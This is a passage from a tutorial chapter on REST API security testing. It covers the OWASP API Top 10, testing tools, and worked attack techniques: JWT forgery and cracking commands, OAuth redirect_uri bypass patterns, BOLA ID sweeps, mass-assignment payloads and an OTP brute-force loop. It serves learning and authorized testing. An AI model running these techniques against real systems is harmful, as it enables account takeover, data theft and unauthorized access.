---
title: REST API Security Testing Methodology
description: >-
  A Advanced-level Bug Bounty & AppSec chapter from Praneeth's cybersecurity
  notebook.
sidebar:
  order: 1
  label: 01 · REST API Security Testing Methodology
head:
  - tag: link
    attrs:
      rel: canonical
      href: >-
        https://ping-praneeth.vercel.app/notebook/appsec-api-bugbounty/01-rest-api-security-testing-methodology
---
**Level:** Advanced · **Track:** Bug Bounty & AppSec · **Read time:** 220 min

This is Chapter 1 of the APIs & CMS notebook. The previous notebook closed out the classic server-side web bugs — SSRF, deserialization, request smuggling, subdomain takeover. Those chapters attacked *pages*. Modern applications, however, are mostly *APIs* with a thin frontend bolted on top, and the single-page app or mobile client you see is just one of many consumers of a JSON backend that is frequently far less hardened than the HTML it renders. This chapter builds the mental model and the repeatable methodology you will reuse for every REST API you ever test — on a bug-bounty program, in a CTF web challenge, or on a red-team engagement.

We start from the absolute basics — what an API is, what makes an API "RESTful", how HTTP verbs and status codes work — so a beginner can follow, then climb to the exact request-manipulation and authorization-logic nuance a senior tester needs to find BOLA (Broken Object Level Authorization), mass assignment, and business-logic flaws that automated scanners never catch. APIs are where the money is in bug bounty right now: the OWASP API Security Top 10 exists precisely because API bugs are pervasive, high-impact, and under-tested.

---

## Part 1: What Is an API, and What Makes It "REST"?

### The plain-English definition

**API** stands for **Application Programming Interface**. Strip away the jargon and it is simply *a contract that lets one piece of software ask another piece of software to do something or return some data*. When your phone's weather app shows the forecast, it is not scraping a webpage — it is sending a request to a weather **API** that returns a small, structured blob of data (usually JSON), and the app renders it. The API is the waiter: you (the client) hand it an order (a request), it walks it back to the kitchen (the server/database), and returns your food (the response). You never touch the kitchen directly, and that boundary is exactly where security controls live — or fail to.

A **web API** is an API you talk to over **HTTP(S)**, the same protocol your browser uses. That is what makes it testable with the exact tools you already know — Burp Suite, curl, Postman — and it is why everything you learned in the earlier web chapters (HTTP requests, headers, cookies, TLS) applies directly here.

### REST: an architectural style, not a protocol

**REST** stands for **REpresentational State Transfer**. It is not a standard you can download or a library you install — it is an *architectural style* described by Roy Fielding in his 2000 doctoral dissertation. An API is called "RESTful" when it follows a set of conventions. The ones that matter for testing:

- **Resources are addressed by URLs.** Everything is a "resource" — a user, an order, a photo — and each has a URL called an **endpoint**, e.g. `https://api.shop.com/v1/orders/1043`. The `1043` is the **object identifier** and it will become the single most important thing you manipulate in this chapter.
- **HTTP verbs express the action.** You don't put the verb in the URL (`/getOrder`); you use the HTTP method. `GET /orders/1043` reads it, `DELETE /orders/1043` deletes it. This is the "uniform interface" principle.
- **Stateless.** Each request carries everything the server needs to process it — typically an auth token in a header. The server keeps no per-client session memory between requests. **Security relevance:** because state isn't held server-side, *the client's token is the whole identity*, and every single request must be independently authorized. When developers forget that "every single request", you get BOLA.
- **Representations.** The same resource can be returned in different formats (JSON, XML); the client asks via the `Accept` header and the server states what it sent via `Content-Type`. Most modern REST APIs speak **JSON**.

REST is not the only style — you'll meet **GraphQL** in the next chapter (Chapter 2), and older systems use **SOAP/XML-RPC**. But REST dominates, so it is where we begin.

### A minimal REST interaction, byte by byte

Here is a real request/response pair. Read every line — understanding this anatomy is the foundation of everything that follows.

```http
GET /v1/orders/1043 HTTP/1.1
Host: api.shop.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5OTEifQ.sig
Accept: application/json
User-Agent: Mozilla/5.0
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 118

{
  "id": 1043,
  "user_id": 991,
  "total": "84.20",
  "status": "shipped",
  "shipping_address": "12 Oak St, Denver"
}
```

Notice four things that we will attack throughout this chapter: the **object ID in the path** (`1043`), the **owner reference in the body** (`user_id: 991`), the **bearer token** that authenticates the caller, and the fact that the server returned **fields the UI may never show** (a full shipping address). Each is a lever.

```mermaid
sequenceDiagram
    participant C as Client (app / your Burp)
    participant G as API Gateway / WAF
    participant A as API Server
    participant D as Database
    C->>G: GET /v1/orders/1043  (Authorization: Bearer ...)
    G->>A: forward if token structurally valid
    A->>A: authN: is the token valid?
    A->>A: authZ: does caller OWN order 1043?  (often missing)
    A->>D: SELECT * FROM orders WHERE id=1043
    D-->>A: row
    A-->>C: 200 OK {full order JSON}
```

The two `authN`/`authZ` self-loops are the crux of API security. **Authentication** ("who are you?") is usually done well — the token is checked. **Authorization** ("are you allowed to touch *this specific object*?") is the step developers forget, and it is where the majority of high-value API bugs live.

---

## Part 2: HTTP Deep-Dive for API Testers — Verbs, Status Codes, Headers

You cannot test what you cannot read. This section makes you fluent in the HTTP that REST is built on.

### HTTP methods (verbs) and what they *should* do

| Verb | Intended action | Idempotent? | Has body? | What to test |
|------|-----------------|-------------|-----------|--------------|
| `GET` | Read a resource | Yes | No | IDOR/BOLA on the ID; verbose responses leaking fields |
| `POST` | Create a resource | No | Yes | Mass assignment; injection; missing rate limits on signup/OTP |
| `PUT` | Replace a resource wholesale | Yes | Yes | Overwrite objects you don't own; mass assignment |
| `PATCH` | Partially update a resource | No | Yes | Update a *single* privileged field (`role`, `is_admin`) |
| `DELETE` | Remove a resource | Yes | No | Delete other users' objects (BOLA on a destructive verb) |
| `OPTIONS` | List allowed methods / CORS preflight | Yes | No | Discover hidden verbs; probe CORS policy |
| `HEAD` | Like GET, headers only | Yes | No | Confirm resource existence without a body (quiet enumeration) |

**Method-based access-control bypass** is a classic: an app blocks `DELETE /admin/users/5` at a proxy but the backend framework silently honors `POST /admin/users/5` with an `X-HTTP-Method-Override: DELETE` header, or maps `GET` and `POST` to the same handler. Always try the *other* verbs against a protected endpoint. Some frameworks also accept the override headers `X-HTTP-Method-Override`, `X-Method-Override`, and `X-HTTP-Method` — send `DELETE` inside them over a `POST` to slip past a verb-based WAF rule.

### Status codes — reading the server's mind

Status codes leak the server's internal decision-making. Learn to read them as an oracle:

| Code | Meaning | Why a tester cares |
|------|---------|--------------------|
| `200 OK` | Success | You got the data — but *should* you have? |
| `201 Created` | Resource created | Your `POST`/`PUT` worked; check what got created |
| `204 No Content` | Success, empty body | Common on `DELETE`/`PATCH`; confirms the write happened |
| `301/302` | Redirect | Often HTTPS→app; watch for open redirects, auth flows |
| `400 Bad Request` | Malformed input | Your payload broke parsing — tweak it |
| `401 Unauthorized` | Not authenticated | Token missing/invalid — you need creds |
| `403 Forbidden` | Authenticated but not allowed | The authZ check *fired*. `403` vs `404` distinguishes "exists but blocked" from "doesn't exist" — an enumeration oracle |
| `404 Not Found` | No such resource | Or a resource hidden behind authZ returning 404 on purpose |
| `405 Method Not Allowed` | Verb not permitted here | Try other verbs; the `Allow` header lists valid ones |
| `429 Too Many Requests` | Rate limited | A control exists — now find where it *doesn't* |
| `500 Internal Server Error` | Unhandled exception | Gold: stack traces, injection feedback, type-confusion |

**The 403-vs-404 oracle** deserves emphasis. If `GET /orders/1043` (yours) returns `200`, `GET /orders/9999999` returns `404`, but `GET /orders/1044` (someone else's) returns `403`, the server *knows* object 1044 exists and is enforcing ownership — a good sign for that endpoint. If instead 1044 returns `200` with data, you have found a **BOLA**. If it returns `404` for everything you don't own, ownership might be enforced *or* it might be leaking existence through timing; test carefully.

### Headers that matter

- **`Authorization`** — carries the credential. `Basic <base64>`, `Bearer <token/JWT>`, or an API-key scheme. Strip it entirely and replay: many endpoints are accidentally public.
- **`Content-Type`** — tells the server how to parse the body (`application/json`, `application/x-www-form-urlencoded`, `multipart/form-data`, `application/xml`). **Switching content type** is an attack: an API expecting JSON may fall back to an XML parser vulnerable to XXE, or parse form-encoded data with a laxer validator.
- **`Accept`** — what the client wants back. Ask for `application/xml` and some frameworks change serializer, exposing different fields.
- **`X-Forwarded-For` / `X-Real-IP`** — trusted by naive rate-limiters and IP allow-lists; spoof to bypass.
- **`X-Api-Version` / URL version (`/v1/`, `/v2/`)** — old versions often lack fixes; always test every version.
- **CORS headers** (`Access-Control-Allow-Origin`, `-Credentials`) — a reflected origin with credentials allowed is a real bug.

---

## Part 3: The OWASP API Security Top 10 — Your Testing Checklist

Everything in this chapter maps to the **OWASP API Security Top 10 (2023)**. Memorize this list; it *is* your methodology's coverage map. Each item is a category of bug you will actively hunt.

| ID | Name | One-line meaning | Where we cover it |
|----|------|------------------|-------------------|
| **API1** | Broken Object Level Authorization (BOLA/IDOR) | You can access objects you don't own by changing an ID | Part 7 |
| **API2** | Broken Authentication | Weak tokens, no expiry, credential stuffing, JWT flaws | Part 6 |
| **API3** | Broken Object Property Level Authorization | Mass assignment (over-write) + excessive data exposure (over-read) | Part 8 |
| **API4** | Unrestricted Resource Consumption | No rate limits → brute force, cost/DoS, OTP flooding | Part 9 |
| **API5** | Broken Function Level Authorization (BFLA) | You can call admin *functions* as a normal user | Part 7 |
| **API6** | Unrestricted Access to Sensitive Business Flows | Automating a flow the business didn't expect (scalping, spam) | Part 9 |
| **API7** | Server-Side Request Forgery | API fetches an attacker-controlled URL | Part 10 |
| **API8** | Security Misconfiguration | Verbose errors, missing headers, debug endpoints, CORS | Part 10 |
| **API9** | Improper Inventory Management | Shadow/zombie APIs, old `/v1/`, undocumented hosts | Part 5 |
| **API10** | Unsafe Consumption of APIs | Trusting third-party APIs blindly | Part 10 |

```mermaid
mindmap
  root((API Attack Surface))
    Authorization
      BOLA / IDOR
      BFLA admin functions
      Object property authZ
    Authentication
      Weak/absent tokens
      JWT algorithm confusion
      Credential stuffing
    Data
      Excessive exposure
      Mass assignment
    Abuse
      No rate limit
      Business-flow abuse
    Config
      Shadow APIs
      Verbose errors
      CORS
      SSRF
```

The single most important observation: **six of the ten are authorization or authentication problems** (API1, API2, API3, API5, API6 in part). API security is overwhelmingly an *access-control* problem, not an injection problem. That reframing is what separates people who find one XSS on an API and people who find a `$10,000` account-takeover chain.

### Real-world cases these categories map to

This isn't theory. High-profile breaches and disclosed bounties trace directly back to these categories — study them to calibrate impact:

| Case (public) | OWASP item | What happened |
|---------------|-----------|---------------|
| Peloton API (2021) | API1 BOLA + API2 | Unauthenticated/authenticated endpoints returned any user's age, gender, weight, and workout data by ID |
| USPS "Informed Visibility" (2018) | API1 BOLA + API3 | An authenticated API let any logged-in user query account details (email, phone, address) of ~60M users by changing parameters |
| Parler scrape (2021) | API4 + API9 | Sequential, unauthenticated post IDs with no rate limiting allowed bulk download of the entire platform |
| T-Mobile / carrier APIs (various) | API1 BOLA | Account/line data reachable by iterating customer or line identifiers |
| Optus (2022) | API2 + API9 | An unauthenticated, internet-exposed API (poor inventory) leaked millions of customers' PII |
| Countless HackerOne reports | API3 mass assignment | Adding `"role":"admin"` / `"is_verified":true` to a profile update = instant privilege escalation |

The pattern is relentless: **iterate an identifier, drop or reuse a token, add a field the UI never sends.** None required a memory-corruption exploit or a novel injection — just the disciplined methodology in this chapter applied to an under-tested JSON backend.

---

## Part 4: Building Your API Testing Toolkit (Tools From Scratch)

Before methodology, tools. We teach each from zero the first time it appears, per the notebook's tool-from-scratch rule. Everything here is on Kali Linux or installs in one command.

### curl — the universal HTTP client

**What it is:** `curl` (client URL) is a command-line tool to send HTTP requests. It ships on Kali, macOS, and most Linux. It is your fastest way to fire a single precise request and read the raw response — no GUI, fully scriptable.

**Core flags every API tester needs:**

```bash
curl -i \                                  # -i: include response headers in output
  -X POST \                                # -X: set the HTTP method
  -H "Authorization: Bearer $TOKEN" \      # -H: add a header (repeatable)
  -H "Content-Type: application/json" \
  -d '{"email":"a@b.com","role":"admin"}' \# -d: request body (implies POST)
  https://api.shop.com/v1/users
```

Other flags you'll lean on: `-s` (silent, hide progress meter), `-k` (ignore TLS cert errors — for testing labs with self-signed certs), `-L` (follow redirects), `-x http://127.0.0.1:8080` (route through Burp so you can see the traffic), `--path-as-is` (don't let curl normalize `../` in the path — essential for path-traversal tests), and `-o /dev/null -w "%{http_code} %{time_total}\n"` to print just the status code and timing (perfect for scripted BOLA sweeps).

### Postman & Insomnia — API workbenches

**What they are:** GUI clients for building, saving, and organizing API requests into "collections". Developers hand you a Postman collection as documentation; that collection *is* a map of the entire API, including endpoints no crawler would find. Import it, then proxy Postman through Burp (Settings → Proxy → add `127.0.0.1:8080`) so every request Postman sends is captured for tampering. **Reconnaissance value:** a leaked `.postman_collection.json` on GitHub is a full API blueprint.

### Burp Suite — the core proxy

**What it is:** Burp Suite is an intercepting HTTP proxy. It sits between your client and the server, letting you view, pause, and rewrite every request/response. It is *the* tool for web/API testing. The free Community edition is enough to learn; Pro adds the automated Scanner and a faster Intruder.

**Architecture / core workflow:**

1. **Proxy** — configure your browser/app to send traffic through Burp (`127.0.0.1:8080`) and install Burp's CA cert so HTTPS is readable. Every request lands in **HTTP history**.
2. **Repeater** — send an interesting request here (`Ctrl+R`) to hand-edit and resend it endlessly. This is where you do 80% of API testing: change an ID, drop a header, flip a JSON field.
3. **Intruder** — automate a request with payload positions (`§markers§`) to fuzz IDs, credentials, or parameter names. Free edition is throttled but works.
4. **Extensions** — the **Autorize** extension (BApp store) is purpose-built for authorization testing: it replays every request with a low-privilege user's token and flags anything that still succeeds. **This one extension finds more BOLA than any manual effort.**

### ffuf — content and parameter fuzzer

**What it is:** `ffuf` (Fuzz Faster U Fool) is a blazing-fast HTTP fuzzer written in Go. You give it a wordlist and a URL with the keyword `FUZZ`; it substitutes each word and reports responses. Install: `apt install ffuf` or `go install github.com/ffuf/ffuf/v2@latest`.

```bash
ffuf -u https://api.shop.com/v1/FUZZ \      # FUZZ = injection point
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,401,403 \                      # -mc: match these status codes
  -fc 404 \                                  # -fc: filter OUT 404s
  -t 40 \                                    # -t: 40 concurrent threads
  -H "Authorization: Bearer $TOKEN"
```

Endpoint discovery, parameter discovery (`-w params.txt -u '...?FUZZ=test'`), and value fuzzing (numeric IDs for BOLA) all use the same tool. **SecLists** (`apt install seclists`) provides the wordlists — the `Discovery/Web-Content/api/` folder is API-specific.

### mitmproxy — scripting and mobile capture

**What it is:** `mitmproxy` is an interactive, scriptable console proxy — think Burp for the terminal, with a Python API. It shines for capturing **mobile app** API traffic (point the phone's proxy at your host, install the mitm CA) and for writing small Python scripts that mutate every request programmatically. Install: `pip install mitmproxy`. Run `mitmweb` for a browser UI.

### Nuclei — templated vulnerability scanning

**What it is:** `nuclei` is a fast scanner driven by YAML "templates" — community-maintained checks for known CVEs, exposures, misconfigurations, and default creds. Install: `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`. It won't find your BOLA (that needs business context) but it *will* catch exposed Swagger docs, actuator endpoints, and known framework CVEs in seconds:

```bash
nuclei -u https://api.shop.com \
  -tags exposure,api,misconfig \
  -severity medium,high,critical
```

### jwt_tool — JWT surgery

**What it is:** `jwt_tool.py` decodes, tampers, and attacks JSON Web Tokens — the `alg:none` trick, weak-secret cracking, algorithm confusion. We use it in Part 6. Install: `git clone https://github.com/ticarpi/jwt_tool`.

```mermaid
flowchart LR
    A[Browser / Mobile app] -->|proxy| B[Burp Suite]
    B --> C[Repeater: manual tamper]
    B --> D[Intruder / ffuf: fuzz IDs & params]
    B --> E[Autorize: authZ testing]
    F[Postman collection / Swagger] -->|import| B
    G[jwt_tool] --> C
    H[Nuclei] -->|known CVEs| A
```

---

## Part 5: Phase 1 — Discovery & Documentation Harvesting (API9)

You cannot test endpoints you don't know exist. Reconnaissance for APIs is about building the *complete* endpoint inventory — including the shadow, zombie, and undocumented ones the developers forgot about (OWASP **API9: Improper Inventory Management**).

### Sources of truth to hunt for

1. **OpenAPI / Swagger specs.** The `openapi.json` / `swagger.json` file is a machine-readable description of *every* endpoint, parameter, and schema. Probe common paths:

   ```
   /swagger.json      /swagger/v1/swagger.json     /openapi.json
   /api-docs          /v2/api-docs                 /swagger-ui/index.html
   /api/swagger       /docs                        /redoc
   /.well-known/openapi.json
   ```

   Finding one is a jackpot: it hands you the entire attack surface. Import it straight into Burp (Pro) or Postman.

2. **Postman collections.** Search GitHub, the public Postman network, and JS bundles for `.postman_collection.json`.

3. **Client-side JavaScript.** Single-page apps embed every API route they call. Pull all JS and grep for paths and fetch calls:

   ```bash
   # collect JS URLs then extract endpoints
   cat js_files.txt | while read u; do curl -s "$u"; done > all.js
   grep -oE '"(/v[0-9]+/[a-zA-Z0-9_/-]+)"' all.js | sort -u
   grep -oE '(fetch|axios|XMLHttpRequest)\([^)]*' all.js
   ```

   Tools like **LinkFinder** and **getJS** automate this. **JS source maps** (`.js.map`) are even better — they reconstruct original source with route tables intact.

4. **Mobile apps.** Decompile the APK (`apktool d app.apk`) and grep `res/` and smali for hostnames and paths; or proxy the app through mitmproxy and just *use* it while recording.

5. **Subdomain & host enumeration.** `api.`, `api-staging.`, `internal-api.`, `mobile-api.` — run `amass`/`subfinder`, then check each for its own doc endpoints. Old versioned hosts (`api-v1.`) are prime **zombie APIs**.

### Fuzzing for undocumented endpoints

When there's no spec, brute-force the routes:

```bash
ffuf -u https://api.shop.com/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc all -fc 404 -ac -t 50 \                # -ac: auto-calibrate to filter noise
  -H "Authorization: Bearer $TOKEN" -o disco.json
```

Then, per discovered collection resource (`/users`, `/orders`), enumerate the standard REST sub-paths and verbs: `/{id}`, `/{id}/edit`, `/{id}/export`, `/search`, `/bulk`, `/admin`, `/internal`, `/debug`.

**Version pivoting (API9):** if the app uses `/v3/`, manually request `/v1/` and `/v2/` of the *same* endpoints. Old versions routinely skip the authorization fix that landed in the current one — a `/v1/users/{id}` that still lacks the ownership check added in `/v3/` is a one-line BOLA. **Bug-bounty note:** version-downgrade BOLA is a recurring, well-paid pattern on HackerOne disclosed reports.

```mermaid
flowchart TD
    A[Target API] --> B{Docs exist?}
    B -->|Swagger/OpenAPI| C[Import full spec into Burp/Postman]
    B -->|Postman collection| C
    B -->|None found| D[Crawl SPA JS + source maps]
    D --> E[Extract routes with LinkFinder/grep]
    B --> F[Subdomain enum: api-*, mobile-*, staging]
    C --> G[Full endpoint inventory]
    E --> G
    F --> G
    G --> H[Fuzz undocumented paths + old versions ffuf]
    H --> I[Attack surface complete - move to testing]
```

---

## Part 6: Phase 2 — Authentication Testing (API2)

Authentication is "who are you?". Break it and you become someone else. Map the scheme first, then attack it.

### Identify the scheme

- **Basic Auth** — `Authorization: Basic base64(user:pass)`. Decodes trivially; only as safe as TLS + password policy. Test for lack of lockout (credential stuffing).
- **API keys** — a static secret in a header (`X-Api-Key`) or query string (`?api_key=...`). Keys in URLs leak into logs, proxies, and `Referer` headers. Test whether one user's key can act on another's data (keys are authN, rarely authZ).
- **Bearer tokens / JWT** — `Authorization: Bearer <JWT>`. The big one; covered below.
- **OAuth 2.0** — a delegation framework issuing access tokens. Test redirect-URI validation, `state` (CSRF) presence, and scope escalation. Full OAuth attacks are their own topic; here, confirm the *resulting* token is validated properly on every request.

### JWT: structure and attacks

A **JWT (JSON Web Token)** is three base64url parts joined by dots: `header.payload.signature`.

```
eyJhbGciOiJIUzI1NiJ9      -> {"alg":"HS256"}                header
.eyJzdWIiOiI5OTEiLCJyb2xlIjoidXNlciJ9  -> {"sub":"991","role":"user"}   payload
.KsA4...signature         -> HMAC/RSA over header.payload    signature
```

The signature is what stops you rewriting the payload. Attacks target that guarantee:

**1. `alg:none` — unsigned acceptance.** If the server honors `"alg":"none"`, strip the signature and forge any payload:

```bash
python3 jwt_tool.py <token> -X a          # -X a: alg:none exploit, auto-forge
# then edit the payload, e.g. "role":"admin", and replay
```

**2. Weak HMAC secret — offline crack.** `HS256` signs with a shared secret. If it's weak, crack it and mint valid tokens:

```bash
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt   # -C: crack, -d: dictionary
# recovered secret -> sign a forged {"sub":"1","role":"admin"} token
hashcat -m 16500 token.txt rockyou.txt     # alternative: mode 16500 = JWT
```

**3. Algorithm confusion (RS256 -> HS256).** If the server verifies with a *public* key but you trick it into treating the token as `HS256`, you can sign with that public key as the HMAC secret:

```bash
python3 jwt_tool.py <token> -X k -pk public.pem   # -X k: key-confusion attack
```

**4. Missing expiry / claim tampering.** Decode and inspect claims: no `exp`? Tokens live forever — a leaked one never dies. Is `sub`/`user_id` the *only* thing binding identity? Swap it and replay. Is authorization decided by a `role`/`isAdmin` claim the client can influence? That's a design flaw.

| JWT weakness | Test | Impact |
|--------------|------|--------|
| `alg:none` accepted | Forge unsigned token | Full auth bypass / account takeover |
| Weak HMAC secret | Crack with jwt_tool/hashcat | Mint arbitrary tokens |
| RS256/HS256 confusion | Sign with public key as HMAC | Forge tokens without private key |
| No `exp` claim | Replay old token | Stolen tokens never expire |
| Sensitive data in payload | base64-decode | Info disclosure (PII, internal IDs) |
| Signature not verified at all | Change payload, keep sig | Trivial privilege escalation |

**CTF note:** JWT `alg:none` and weak-secret challenges are staples of PortSwigger's JWT labs and picoCTF web categories — the exact `jwt_tool` flags above solve most of them.

### OAuth 2.0 flows — the parts you actually test

OAuth 2.0 is not a login protocol; it is an *authorization-delegation* framework that ends by handing the client an **access token** (often a JWT). Because so many APIs sit behind "Login with Google/GitHub/Okta", you must understand the flow to find its bugs. The dominant flow is **Authorization Code + PKCE**:

```mermaid
sequenceDiagram
    participant U as User / Browser
    participant C as Client (the app)
    participant AS as Authorization Server (Google/Okta)
    participant API as Resource API
    U->>C: click "Login with X"
    C->>AS: redirect: /authorize?client_id&redirect_uri&scope&state&code_challenge
    AS->>U: login + consent
    AS->>C: redirect back: ?code=AUTHCODE&state=...
    C->>AS: POST /token (code + code_verifier + client_secret)
    AS-->>C: access_token (+ refresh_token)
    C->>API: GET /resource  Authorization: Bearer access_token
    API-->>C: 200 data
```

The high-value bugs live in the redirect and the parameters, not the crypto:

- **`redirect_uri` validation** — if the AS accepts an attacker-controlled or loosely-matched redirect (`https://legit.com.evil.com`, `https://legit.com/callback/../../evil`, `?redirect_uri=https://legit.com&redirect_uri=https://evil.com`), the `code` is delivered to the attacker → account takeover. Test suffix/prefix matches, open-redirect chains on the whitelisted host, and duplicate-parameter tricks.
- **`state` parameter** — this is OAuth's CSRF token. Missing or unvalidated `state` lets an attacker stitch their `code` onto a victim's session (login CSRF / account linking abuse).
- **PKCE (`code_challenge`)** — public clients must use it. If the `/token` endpoint doesn't enforce the `code_verifier`, a stolen `code` is redeemable by anyone.
- **Scope escalation** — request extra scopes (`?scope=openid profile admin`) and see if the AS grants them without re-consent.
- **Token validation at the API** — the resource API must validate `aud` (audience), `iss` (issuer), signature, and expiry. A token minted for app X accepted by app Y is a cross-service takeover.

**Bug-bounty note:** `redirect_uri` bypasses and missing `state` are among the most frequently paid OAuth findings; PortSwigger's OAuth labs drill exactly these.

### Other authentication weaknesses to check

- **No rate limit on login / OTP / password reset** (overlaps API4) — enables credential stuffing and OTP brute force.
- **Token in URL** — leaks via logs and `Referer`.
- **Reset tokens** predictable or reusable.
- **Endpoints missing auth entirely** — strip the `Authorization` header and replay every endpoint. Accidentally-public APIs are shockingly common. **Red team usage:** an unauthenticated `/v1/internal/metrics` or `/debug` endpoint is a first-foothold goldmine.

---

## Part 7: Phase 3 — Authorization Testing: BOLA & BFLA (API1 & API5)

This is the heart of API testing and the source of the highest-paid bugs. Authorization is "are you allowed to do *this*?" — and it must be re-checked on *every* request because REST is stateless.

### BOLA / IDOR (API1): accessing objects you don't own

**Broken Object Level Authorization** (a.k.a. **IDOR — Insecure Direct Object Reference**) happens when the server uses the object ID you supply *without* verifying you own that object. It is the single most common serious API bug.

**The core test:** create two accounts (attacker "A" and victim "B"). As B, note an object ID (order 2001). As A — using A's token — request B's object:

```http
GET /v1/orders/2001 HTTP/1.1
Host: api.shop.com
Authorization: Bearer <ATTACKER_A_TOKEN>
```

If you get `200` with B's data, that's a BOLA. Confirmed impact = read of another user's order (PII). Then escalate to *write*: `PUT`/`PATCH`/`DELETE` B's object.

**Where the ID hides — check all of these:**

- Path: `/orders/2001`
- Query: `?order_id=2001`, `?user=991`
- Body: `{"order_id":2001}`
- Headers: `X-User-Id: 991`
- Nested/related: `/users/991/orders`, `/orders/2001/invoice`

**ID formats and how to defeat "hard-to-guess" IDs:**

| ID type | Example | How to attack |
|---------|---------|---------------|
| Sequential integer | `1043`, `1044` | Increment/decrement; trivial to enumerate |
| UUID/GUID | `f47ac10b-...` | "Unguessable" != "authorized" — harvest real UUIDs from other responses, search, exports, error messages, then replay |
| Hashed/encoded | `MTA0Mw==` | Decode (base64 -> `1043`), tamper, re-encode |
| Predictable "random" | timestamp-based | Analyze structure; often not random at all |
| Email/username as ID | `?user=b@x.com` | Substitute known victim identifier |

The crucial mental shift: **a UUID is not an access control.** If the endpoint returns *anyone's* object given the right UUID, it is still BOLA — the fix is an ownership check, not a bigger ID. Harvest victim UUIDs from list endpoints, comment threads, shared links, `Location` headers, and verbose responses, then feed them back.

**Automating the sweep with Burp Autorize:** log in as low-priv user A, put A's token in Autorize, then browse the app *as high-priv/other user B*. Autorize replays every B request with A's token and colour-codes the result: red = same response (BOLA!), green = properly blocked. This finds BOLA across the whole app hands-free.

**Manual mass check with ffuf** (enumerate an ID range as attacker A):

```bash
ffuf -u https://api.shop.com/v1/orders/FUZZ \
  -w <(seq 1000 3000) \                       # numeric range as wordlist
  -H "Authorization: Bearer $A_TOKEN" \
  -mc 200 -t 20 \
  -o bola.json
# every 200 that isn't A's own order == unauthorized read
```

```mermaid
flowchart TD
    A[Create 2 accounts: attacker A, victim B] --> B[As B, capture object IDs: order 2001]
    B --> C[As A, request B's object with A's token]
    C --> D{Response?}
    D -->|200 + B's data| E[BOLA confirmed - READ]
    D -->|403/404| F[Ownership enforced here]
    E --> G[Escalate: PUT/PATCH/DELETE B's object]
    G --> H{Write succeeds?}
    H -->|Yes| I[Critical: modify/delete others' data]
    F --> J[Try other endpoints, versions, ID locations]
```

### BFLA (API5): calling functions above your privilege

**Broken Function Level Authorization** is BOLA's sibling: instead of another user's *object*, you access an admin *function* as a normal user. The endpoint enforces authentication but not *role*.

**The test:** enumerate admin-style routes and call them with a low-privilege token:

```
GET  /v1/admin/users            # list all users
POST /v1/admin/users/5/ban
GET  /v1/admin/reports/export
PATCH /v1/users/5  {"role":"admin"}
DELETE /v1/products/88
```

Combine with the **method trick** from Part 2: an endpoint may block `GET /admin/users` (used by the UI) but permit `POST` or a different verb that hits the same handler without the role gate. Also test **role tampering**: intercept a request as a normal user and change a `role`/`isAdmin`/`accountType` value in the JSON — if the server trusts it, that's both BFLA and mass assignment.

**Bug-bounty reality:** a low-priv user reaching `POST /admin/promote` and making themselves admin is a textbook critical worth four to five figures on mature programs. Always test the *admin* endpoints your recon surfaced with a *non-admin* token.

---

## Part 8: Phase 4 — Object Property Authorization: Mass Assignment & Excessive Data Exposure (API3)

API3 has two faces: writing properties you shouldn't (mass assignment) and reading properties you shouldn't (excessive data exposure).

### Mass assignment (over-writing properties)

Many frameworks auto-bind incoming JSON fields to database model attributes (Rails `params.permit` gone wrong, Spring `@ModelAttribute`, Node `Object.assign(user, req.body)`). If the model has a sensitive field like `is_admin`, `balance`, `verified`, or `role`, and the binder isn't allow-listed, you can set it by *just adding it to the request body*.

**The test:** take a legitimate write (profile update), then add extra fields the UI never sends:

```http
PATCH /v1/users/me HTTP/1.1
Authorization: Bearer <YOUR_TOKEN>
Content-Type: application/json

{
  "name": "Test Tester",
  "email": "me@x.com",
  "role": "admin",
  "is_verified": true,
  "account_balance": 999999,
  "user_id": 1
}
```

The last four fields are the injected ones — the UI only ever sends `name` and `email`.

**How to know which fields to inject:** read them from a `GET` of the same resource — the response often lists every property (`role`, `credits`, `is_staff`). Whatever the server *returns*, try to *send back* mutated. Swagger schemas and JS models reveal hidden fields too.

| Injected field pattern | Goal |
|------------------------|------|
| `role`, `is_admin`, `is_staff`, `groups` | Privilege escalation |
| `verified`, `email_verified`, `kyc_passed` | Bypass verification gates |
| `balance`, `credits`, `price`, `discount` | Financial manipulation |
| `id`, `user_id`, `owner_id` | Re-point the write to another object (BOLA via body) |
| `status`, `approved`, `is_active` | Workflow/state bypass |

### Excessive data exposure (over-reading properties)

The inverse: the API returns *more* than the client needs, trusting the frontend to hide the rest. The mobile app shows only a username, but the JSON also carries `email`, `phone`, `password_hash`, `2fa_secret`, internal flags. **Never judge exposure by the UI — read the raw JSON.** A `/v1/users/me` that returns your password reset token or another field is a leak; a `/v1/users` list that returns every user's email is a PII disclosure worth reporting even without BOLA.

**Test technique:** for every response, diff what the UI uses against what the JSON contains. Ask for related/expanded resources (`?include=payment_methods`, `?expand=all`) — servers frequently over-return on expansion parameters.

**Blue team usage:** the defensive fix for both faces is the same principle — *explicit allow-lists*. Serialize responses through a DTO/schema that names exactly the fields to expose, and bind writes through an allow-list of mutable fields. "Deny by default" on properties, not just endpoints.

---

## Part 9: Phase 5 — Rate Limiting & Business-Logic Abuse (API4 & API6)

### Unrestricted resource consumption (API4)

APIs that don't cap request volume enable brute force (OTP, passwords, coupon codes), scraping, and cost/DoS (an endpoint that triggers an expensive report or an SMS on every call). **Test:** fire the same request many times and watch for `429`, `Retry-After`, or a hard block:

```bash
# hammer an OTP-verify endpoint; look for a 429 that never comes
for i in $(seq 1 500); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.shop.com/v1/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"+1555000\",\"otp\":\"$(printf '%04d' $i)\"}"
done | sort | uniq -c
#   500 200   <- no throttling: 4-digit OTP fully brute-forceable
```

**Rate-limit bypasses to try** when a limit *does* exist: rotate `X-Forwarded-For`/`X-Real-IP` (naive limiters key on it), vary casing/trailing slash of the path (`/verify`, `/verify/`, `/Verify`), switch between `/v1/` and `/v2/`, add a null byte or padding to the identifier, or use HTTP/2 request multiplexing. Also test whether the limit is *per-endpoint* — sometimes the reset endpoint is limited but a second endpoint hitting the same OTP check is not.

